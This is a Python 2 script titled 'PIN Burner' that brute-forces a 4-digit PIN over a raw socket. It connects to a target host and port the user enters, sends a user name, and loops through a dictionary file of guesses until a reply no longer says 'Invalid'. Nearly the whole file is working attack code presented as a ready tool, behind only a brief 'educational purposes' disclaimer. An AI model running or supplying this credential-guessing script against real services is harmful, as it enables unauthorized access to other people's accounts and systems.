# Script designed to force a 4 digit pin using a socketed connection
# Written by Azlirn

# This program does require a dictionary file.
# You can find one here: https://ghostbin.com/paste/nnkyy

########## SET UP ##########

import time
import socket
import platform


##### SYS CHECK AND ACTIVATE COLORS #####
print "\nWelcome to PIN Burner! We have a few fast thing to check before we move on..."
time.sleep(.5)
print "Checking to see if we can use colors on your OS..."
time.sleep(.5)

if platform.system() == 'win32' or platform.system() == 'win64':
	print "Color Options will be skipped on Windows Systems"
	# if windows, don't use colors
	(o,r,g,y,b,m,w,c,R,G,Y) = ('','','','','','','','','','','')
else:
	o 			= '\033[0m' 	#off
	r 			= '\033[31m' 	#red
	g 			= '\033[32m' 	#green
	y 			= '\033[33m' 	#yellow
	b 			= '\033[34m' 	#blue
	m 			= '\033[35m' 	#magenta
	w 			= '\033[37m' 	#white
	c			= '\033[1;38m'  #crimson
	R			= '\033[1;41m'  # Highlighted Red
	G 			= '\033[1;42m'  # Highlighted Green
	Y 			= '\033[1;43m'  # Highlighted Yellow
	print "You are running an OS compatible with colors. Activating now..."
	time.sleep(.5)

##### Check for a Compatible Operating System #####

print y, "Checking for compatible platform...", o
time.sleep(.5)

if platform.system() == 'win32' or platform.system() == 'win64':
	print r, "Program is not supported on Windows Operating Systems! Exiting Application...", o
	exit()
elif platform.system() == 'Linux':
	print g, "Looks like you are running a compatible platform! Continuing...", o

##### Check for root privileges, exit if root is detected. #####
"""
print y, "Checking for root user", o
if platform.system() == 'Linux':
		if os.geteuid() == 0:
			print r, "Program will not run with root privileges! Exiting Application..."
			exit()
"""

print g, "System checks complete! Thank you for waiting!\n\n"
time.sleep(1)

##### WELCOME #####

print r, "-------------------------------------------------", o
print w, "---------------      Welcome      ---------------", o
print b, "-----            Written in 2015            -----", o
print r, "-------------------------------------------------", o

print r,"  (   (       )					", o
print r,"  )\ ))\ ) ( /(     (                           	", o
print r," (()/(()/( )\())  ( )\   (  (           (  (    	", o
print r,"  /(_))(_))(_)\   )((_) ))\ )(   (     ))\ )(   	", o
print y," (_))(_))  _((_) ((_)_ /((_)()\  )\ ) /((_)()\  	", o
print b," | _ \_ _|| \| |  | _ )_))( ((_)_(_/((_))  ((_) 	", o
print b," |  _/| | | .` |  | _ \ || | '_| ' \)) -_)| '_| 	", o
print b," |_| |___||_|\_|  |___/\_,_|_| |_||_|\___||_| 		", o

print r,"""
This program is free software. It is intended for educational purposes ONLY.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.
""", o
time.sleep(2)

USER = raw_input("Enter the user name you want to use: ")
HOST = raw_input("Enter the target host (ONLY TESTED WITH IPv4 Addresses): ")
PORT = raw_input("Enter the target port: ")
DIC = raw_input("Enter the location of your dictionary file: ")

########## MAIN ##########


##### CONNECTION #####

# Connect to Host
print y, "Connecting to host...\n", o
time.sleep(1)

s = socket.socket()
s.settimeout(2)
s.connect((HOST, int(PORT)))
print g, "Connected!\n", o
answer = s.recv(1024)
# printing first prompt
print  answer
print y, "Sending user name:", m, USER, o

# Log in as 'User'
s.send(USER)
answer = s.recv(2048)
# printing second prompt
print  answer


##### START GUESSING #####

print b, "Getting ready to start guessing...\n", o
time.sleep(1)

##### Timer #####
print y, "Starting timer...\n\n", o
time.sleep(2)
done = False
start = time.time()

# Open dictionary
dic = open(DIC, 'r')

# Guess
while done is False:
	for word in dic:
		guess = word
		s.send(guess)
		print g, "Guessing... ",b + guess, o
		answer = s.recv(1024)
		print y, answer, o
		# If your guess is right, stop guessing
		if "Invalid" not in answer:
			done = True
			print g, "[**/\CRACKED/\**] The pin is... ",m + guess, o
			break


##### End Timer #####

# Calculate how long it took to find pin and print result
elapsed = (time.time() - start)
print y, 'Time to guess pin: ' + str(elapsed), o

time.sleep(1)

print g, '\nClosing application...', o

time.sleep(1)


########## END ##########
